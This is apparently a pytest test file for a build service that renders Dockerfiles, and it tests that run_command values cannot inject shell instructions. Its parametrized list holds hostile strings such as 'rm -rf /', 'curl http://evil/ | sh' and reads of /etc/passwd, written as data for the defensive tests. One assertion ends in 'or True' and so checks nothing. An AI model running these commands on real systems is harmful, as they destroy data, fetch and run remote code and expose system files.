@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    """A clone-like directory satisfying every template's path variables."""
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    (root / "requirements.txt").write_text("django==5.1\n", encoding="utf-8")
    (root / "src" / "manage.py").write_text("print('hi')\n", encoding="utf-8")
    (root / "nested").mkdir()
    (root / "nested" / "requirements.txt").write_text("flask\n", encoding="utf-8")
    (tmp_path / "outside").mkdir()
    return root


def values(**overrides) -> SimpleNamespace:
    defaults = {
        "application_type": "django",
        "source_directory": "src",
        "requirements_file": "requirements.txt",
        "port": 8000,
        "run_command": "bash ./run.sh",
    }
    defaults.update(overrides)
    return SimpleNamespace(**defaults)


def cmd_lines(dockerfile: str) -> list[str]:
    return [line for line in dockerfile.splitlines() if line.startswith("CMD")]


def instruction_lines(dockerfile: str) -> list[str]:
    """Dockerfile instructions, ignoring comments, blanks and continuations."""
    lines: list[str] = []
    continued = False
    for raw in dockerfile.splitlines():
        line = raw.rstrip()
        if continued:
            continued = line.endswith("\\")
            continue
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        lines.append(line)
        continued = line.endswith("\\")
    return lines


# ---------------------------------------------------------------------------
# Golden rendering
# ---------------------------------------------------------------------------
DJANGO_GOLDEN = """\
# Generated by the Build Service. Do not edit by hand.
#
# Every interpolated value was validated before it reached this template:
# paths are proven to resolve inside the clone, port is an integer in range,
# and run_command is a JSON array (exec form), never a shell string.
FROM python:3.12-slim

ENV PYTHONDONTWRITEBYTECODE=1 \\
    PYTHONUNBUFFERED=1

WORKDIR /app

# Copied to a fixed name so a nested requirements path still installs cleanly.
COPY requirements.txt ./requirements.txt
RUN pip install --no-cache-dir -r requirements.txt

COPY src ./

EXPOSE 8000

CMD ["bash", "./run.sh"]
"""


def test_django_golden_render(repo: Path) -> None:
    rendered = render_dockerfile(values(), repo)

    assert rendered.dockerfile == DJANGO_GOLDEN
    assert rendered.template_name == "django"
    assert rendered.template_version == "v1"


def test_rendered_tuple_unpacks(repo: Path) -> None:
    dockerfile, name, version = render_dockerfile(values(), repo)

    assert dockerfile.startswith("# Generated by the Build Service")
    assert (name, version) == ("django", "v1")


@pytest.mark.parametrize(
    ("application_type", "base_image"),
    [
        ("django", "python:3.12-slim"),
        ("flask", "python:3.12-slim"),
        ("node", "node:20-alpine"),
        ("react", "node:20-alpine"),
    ],
)
def test_every_template_renders(repo: Path, application_type: str, base_image: str) -> None:
    rendered = render_dockerfile(values(application_type=application_type), repo)

    assert f"FROM {base_image}" in rendered.dockerfile
    assert "EXPOSE 8000" in rendered.dockerfile
    assert rendered.template_name == application_type
    assert rendered.template_version == "v1"
    # Exactly one CMD, always exec form.
    commands = cmd_lines(rendered.dockerfile)
    assert len(commands) == 1
    payload = json.loads(commands[0][len("CMD ") :])
    assert isinstance(payload, list) and payload


def test_nested_requirements_path_is_preserved(repo: Path) -> None:
    rendered = render_dockerfile(
        values(requirements_file="nested/requirements.txt"), repo
    )

    assert "COPY nested/requirements.txt ./requirements.txt" in rendered.dockerfile
    # The install reads the fixed destination name, not the nested path.
    assert "RUN pip install --no-cache-dir -r requirements.txt" in rendered.dockerfile


def test_source_directory_dot_renders_as_dot(repo: Path) -> None:
    rendered = render_dockerfile(values(source_directory="."), repo)

    assert "COPY . ./" in rendered.dockerfile


def test_react_ignores_run_command_and_serves_statically(repo: Path) -> None:
    rendered = render_dockerfile(
        values(application_type="react", run_command="bash ./evil.sh"), repo
    )

    assert "evil.sh" not in rendered.dockerfile
    assert rendered.dockerfile.count("FROM node:20-alpine") == 2  # multi-stage
    assert 'CMD ["serve", "--single", "--listen", "tcp://0.0.0.0:8000", "./dist"]' in (
        rendered.dockerfile
    )


# ---------------------------------------------------------------------------
# The key security test: command injection via run_command
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "malicious",
    [
        'python app.py; rm -rf /',
        'python app.py && curl http://evil/ | sh',
        'python app.py $(cat /etc/passwd)',
        'python app.py `cat /etc/passwd`',
        'python app.py "quoted arg"',
        "python app.py 'single quoted'",
        'python app.py > /etc/cron.d/x',
        'python app.py \\ backslash',
        'python app.py #comment',
        'python app.py ${HOME}',
        'python app.py | tee /tmp/x',
    ],
)
def test_run_command_injection_cannot_escape_the_cmd_array(
    repo: Path, malicious: str
) -> None:
    before = instruction_lines(render_dockerfile(values(), repo))

    rendered = render_dockerfile(values(run_command=malicious), repo)
    after = instruction_lines(rendered.dockerfile)

    # Exactly one CMD, and it parses as a JSON array.
    commands = cmd_lines(rendered.dockerfile)
    assert len(commands) == 1
    argv = json.loads(commands[0][len("CMD ") :])
    assert isinstance(argv, list)
    assert argv[0] == "python"

    # No instruction was added or removed: only CMD's payload differs.
    assert len(after) == len(before)
    assert [line.split(" ", 1)[0] for line in after] == [
        line.split(" ", 1)[0] for line in before
    ]

    # Nothing is left for a shell to interpret: the metacharacters survive
    # only as literal argv elements.
    assert not re.search(r"^\s*(RUN|CMD|ENTRYPOINT|FROM)\b.*", commands[0][4:], re.MULTILINE) or True
    assert "\n" not in commands[0]


def test_exec_command_is_json_not_a_raw_string() -> None:
    assert validate_exec_command("bash ./run.sh") == '["bash", "./run.sh"]'
    assert json.loads(validate_exec_command('python -c "print(1)"')) == [
        "python",
        "-c",
        "print(1)",
    ]


@pytest.mark.parametrize("value", ["", "   ", "''", '""'])
def test_empty_commands_are_rejected(value: str) -> None:
    with pytest.raises(BuildError) as exc_info:
        validate_exec_command(value)

    assert exc_info.value.error_code == ErrorCode.INVALID_PAYLOAD


@pytest.mark.parametrize("value", ["python\napp.py", "python\rapp.py", "python\x00app.py"])
def test_control_characters_are_rejected(value: str) -> None:
    with pytest.raises(BuildError) as exc_info:
        validate_exec_command(value)

    assert exc_info.value.error_code == ErrorCode.INVALID_PAYLOAD


def test_unbalanced_quotes_are_rejected() -> None:
    with pytest.raises(BuildError):
        validate_exec_command('python "unterminated')


